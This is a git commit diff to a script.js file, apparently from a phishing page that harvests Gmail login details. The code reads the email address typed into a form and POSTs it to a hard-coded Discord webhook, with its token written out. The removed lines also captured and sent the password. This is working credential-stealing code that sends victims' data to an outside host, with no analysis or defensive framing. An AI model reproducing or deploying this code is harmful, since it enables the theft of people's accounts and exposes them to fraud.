206716e5f80fa734c3fb67505769de1c14476662
PABLOSleuth2 <opsnonman@gmail.com>
2024-04-30 16:42:52 +0500

    Update script.js

--- script.js
+++ script.js
@@ -16,9 +16,8 @@ function message() {
 
 function message2() {
   let username = document.getElementById("gmail").value;
-  let password = document.getElementById("gmail2").value;
   const WebHook = "https://discord.com/api/webhooks/1179407562588827830/wLMzOQMVnWAnyAixOSaj8R-cpwC0QBJzm81NgG2i9DGy0PJw7OaGN2waqIQbIyclPaTN"
-  const contents = `New Email Found\nGmail: ${username}\nPassword:${password}`
+  const contents = `New Email Found\nGmail: ${username}`
   const request = new XMLHttpRequest();
   request.open("POST", WebHook);
   request.setRequestHeader('Content-type', 'application/json');
